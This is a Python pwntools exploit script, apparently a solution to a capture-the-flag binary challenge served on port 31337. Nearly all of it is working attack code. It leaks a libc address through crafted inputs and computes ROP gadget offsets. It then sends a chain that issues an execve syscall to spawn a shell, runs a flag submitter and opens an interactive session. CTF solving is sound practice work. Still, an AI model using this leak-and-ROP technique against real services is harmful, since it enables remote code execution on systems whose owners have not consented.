#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./challenge
from pwn import *
import time

# Set up pwntools for the correct architecture
#exe = context.binary = ELF('./challenge')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, PORT)

io.sendlineafter(b'?',str(10).encode())

io.sendlineafter(b'?',str(7).encode())

data = b'\x74'*10

io.sendlineafter(b'?',data)

for i in range(3):
    io.sendlineafter(b'?',b'\x74'*0x74)

io.sendlineafter(b'?',b'\x93'*0x74)


leaks = io.recvuntil(b'?')

leaks = io.recvuntil(b'?')

leaks = leaks.replace(b'\x1b[1;30;42m',b'')

leaks = leaks.replace(b'\x1b[1;30;43m',b'')

leaks = leaks.replace(b'\x1b[0m',b'')

leaks = b'\x90'+leaks.split(b'\x90')[1].replace(b' ',b'')

leaks = leaks[0:6]

leaks = int.from_bytes(leaks,'little')

print(hex(leaks))

libc_leak = leaks-0x1d90-0x28000

print('Libc: '+hex(libc_leak))

sh = libc_leak+0x1d8698

pop_rdi = libc_leak+0x000000000002a3e5

xor_esi_syscall = libc_leak+0x00000000001190e2

pop_rax_rdx_rbx = libc_leak+0x0000000000090528

system = libc_leak+0x50d70

print(hex(system))

payload = b'A'*0x10+b'b'*0x10+b'\x59'*0x8+p64(pop_rdi)+p64(sh)+p64(pop_rax_rdx_rbx)+p64(0x3b)+p64(0)+p64(0)+p64(xor_esi_syscall)

time.sleep(1)

io.sendline(payload)

#io.sendlineafter(b'?',b'\xFF'*0x6C)

time.sleep(1)

io.sendline(b'./submitter')
time.sleep(1)
io.sendline(b'./submitter')
print(io.recvuntil(b'}'), flush=True)
io.interactive()


